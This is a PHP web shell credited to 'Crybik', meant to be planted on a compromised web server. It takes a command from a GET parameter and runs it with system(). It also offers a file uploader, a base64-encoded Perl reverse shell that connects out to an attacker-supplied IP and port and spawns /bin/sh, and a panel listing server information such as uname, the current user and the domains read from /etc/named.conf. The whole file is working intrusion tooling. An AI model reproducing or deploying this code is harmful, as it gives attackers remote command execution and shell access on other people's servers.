          <!! Q shell script coded by Crybik !!>
       <!! Q shell script coded by Crybik !!>
    <!! Q shell script coded by Crybik !!>
 <!! Q shell script coded by Crybik !!>
<html>
<center>
<form action="" method="GET">
<input name="crybik" class="crybik">
<input class="myButton" type="submit" class="hhhhhhhh">
</html>
<style>
.crybik {color:red;
background-color:black;
font-size:24px;
}
.hhhhhhhh {
	color:red;
	background-color:black;
	font-size:24px;
}
body {
	background-color:gray;
}
</style>
<br> <br> <hr> 
<?php
$crybik = $_GET['crybik'];
system ($crybik);
?>
</form>
<br> <br>
<?php
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" class="myButton" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
	if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo "<b>Upload Succes !!!  </b><br><br>"; }
	else { echo '<b>Upload Fail !!!</b><br><br>'; }
}
?>
<br> <hr> <br>
<?php
if (isset($_GET['bc'])) {$_0c5e3246e473="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";echo "<center><br><br><form name='nfp' onSubmit=\"g(null,null,'bcp',this.server.value,this.port.value);return false;\" method='POST'><span style='font-family: cursive; font-size: 200%; color: Black;'>BC</span><h3>Your Ip:</h3> <input type='text' class='xlol' name='server' value='". $_SERVER['REMOTE_ADDR'] ."'><br><br> <hr><h3>Port to bind:</h3>  <input type='text' name='port' class='xlol' value='21'><br><br><input class='myButton' type=submit name='backconnect' value='Submit'></form><br>";if(isset($_POST['backconnect'])) {function cf($_e0887aa7bc0b,$_9c65822c9127) {$_dfb1f07e894f = @fopen($_e0887aa7bc0b,"w") or @function_exists('file_put_contents');if($_dfb1f07e894f){@fwrite($_dfb1f07e894f,@base64_decode($_9c65822c9127));@fclose($_dfb1f07e894f);}}function An0n3xPloiTeR($_6d1b263a32f3) {$_1765c46dda35 = '';if (function_exists('exec')) {@exec($_6d1b263a32f3,$_1765c46dda35);$_1765c46dda35 = @join("\n",$_1765c46dda35);} elseif (function_exists('passthru')) {ob_start();@passthru($_6d1b263a32f3);$_1765c46dda35 = ob_get_clean();} elseif (function_exists('system')) {ob_start();@system($_6d1b263a32f3);$_1765c46dda35 = ob_get_clean();} elseif (function_exists('shell_exec')) {$_1765c46dda35 = shell_exec($_6d1b263a32f3);} elseif (is_resource($_e0887aa7bc0b = @popen($_6d1b263a32f3,"r"))) {$_1765c46dda35 = "";while(!@feof($_e0887aa7bc0b))$_1765c46dda35 .= fread($_e0887aa7bc0b,1024);pclose($_e0887aa7bc0b);}return $_1765c46dda35;}if($_POST['backconnect']) {cf("/tmp/bc.pl",$_0c5e3246e473);$_1765c46dda35 = An0n3xPloiTeR("perl /tmp/bc.pl ".$_POST['server']." ".$_POST['port']." 1>/dev/null 2>&1 &"); sleep(1);echo "<pre class=ml1>$_1765c46dda35\n".An0n3xPloiTeR("ps aux | grep bc.pl")."</pre>"; unlink("/tmp/bc.pl");}}}
?>
<style>
.xlol {
	background-color:black;
	color:red;
	font-size:19px;
}
</style>
<br><br><hr><br>
<a href="?bc">
<input type="submit" class="myButton" value="Back connect :D " />
<br><br>
<a href="?info">
<input type="submit" class="myButton" value="Server Informations " />
</a>
<style>
head{background-color:black;}
.myButton {
	-moz-box-shadow: 0px 1px 0px 0px #fff6af;
	-webkit-box-shadow: 0px 1px 0px 0px #fff6af;
	box-shadow: 0px 1px 0px 0px #fff6af;
	background:-webkit-gradient(linear, left top, left bottom, color-stop(0.05, #ffec64), color-stop(1, #ffab23));
	background:-moz-linear-gradient(top, #ffec64 5%, #ffab23 100%);
	background:-webkit-linear-gradient(top, #ffec64 5%, #ffab23 100%);
	background:-o-linear-gradient(top, #ffec64 5%, #ffab23 100%);
	background:-ms-linear-gradient(top, #ffec64 5%, #ffab23 100%);
	background:linear-gradient(to bottom, #ffec64 5%, #ffab23 100%);
	filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffec64', endColorstr='#ffab23',GradientType=0);
	background-color:#ffec64;
	-moz-border-radius:6px;
	-webkit-border-radius:6px;
	border-radius:6px;
	border:1px solid #ffaa22;
	display:inline-block;
	cursor:pointer;
	color:#333333;
	font-family:Arial;
	font-size:15px;
	font-weight:bold;
	padding:6px 24px;
	text-decoration:none;
	text-shadow:0px 1px 0px #ffee66;
}
.myButton:hover {
	background:-webkit-gradient(linear, left top, left bottom, color-stop(0.05, #ffab23), color-stop(1, #ffec64));
	background:-moz-linear-gradient(top, #ffab23 5%, #ffec64 100%);
	background:-webkit-linear-gradient(top, #ffab23 5%, #ffec64 100%);
	background:-o-linear-gradient(top, #ffab23 5%, #ffec64 100%);
	background:-ms-linear-gradient(top, #ffab23 5%, #ffec64 100%);
	background:linear-gradient(to bottom, #ffab23 5%, #ffec64 100%);
	filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffab23', endColorstr='#ffec64',GradientType=0);
	background-color:#ffab23;
}
.myButton:active {
	position:relative;
	top:1px;
}

</style>
<p>
<?
if (isset($_GET['info'])) {?>
						<center><br><br>
						<style>
						body
						{
							background-color:#220707;
						}
						</style>
						<!! Taken from my frind An0n3xPloiTeR <3 :D !!>
						<font style="color: red; font-family: cursive; font-size: 130%;">Uname: <?php echo php_uname(); ?></font><br>
						<font style="color: silver; font-family: cursive; font-size: 130%;">Browser: <?php echo $_SERVER['HTTP_USER_AGENT']; ?></font><br>
						<font style="color: lawngreen; font-family: cursive; font-size: 130%;">Server Software: <?php echo $_SERVER['SERVER_SOFTWARE']; ?> </font><br>
						<font style="color: red; font-family: cursive; font-size: 130%;">Server IP: <?php echo $_SERVER['SERVER_ADDR']; ?></font><br>
						<font style="color: lawngreen; font-family: cursive; font-size: 130%;">User IP: <?php echo $_SERVER['REMOTE_ADDR']; ?></font><br>
						<font style="color: red; font-family: cursive; font-size: 130%;">User: <?php echo @get_current_user(); ?></font><br>
						<font style="color: red; font-family: cursive; font-size: 130%;">Safe Mode:&nbsp;<?php $_ee24408cd02b = ini_get('safe_mode'); if ($_ee24408cd02b == 1) { echo '<span style="color: red;">On';} else {echo '<span style="color: lawngreen;">Off</span>';}?>
						</font><br>
						<font style="color: lawngreen; font-family: cursive; font-size: 130%;">Domains: <?php if(strtolower(substr(PHP_OS,0,3)) == "win") {$_f3d329025a5d = 'win';}else {$_f3d329025a5d = 'nix';}if($_f3d329025a5d == 'nix') {$_1a1142d4b381 = @file_get_contents("/etc/named.conf");if(!$_1a1142d4b381) {$_b9c59d921b4e = "/var/named";$_011c7db1e205 = scandir($_b9c59d921b4e);$_0d88a9bd4c27 = count($_011c7db1e205);} else {@preg_match_all('/.*?zone "(.*?)" {/', $_1a1142d4b381, $_1765c46dda35);$_1765c46dda35 = sizeof(array_unique($_1765c46dda35[1])); $_0d88a9bd4c27 = $_1765c46dda35."  Domains";}} else {$_0d88a9bd4c27 = "1";} echo $_0d88a9bd4c27; }?>
						</p>
<!! Q shell script coded by Crybik !!>
   <!! Q shell script coded by Crybik !!>
      <!! Q shell script coded by Crybik !!>
         <!! Q shell script coded by Crybik !!>
            <!! Q shell script coded by Crybik !!>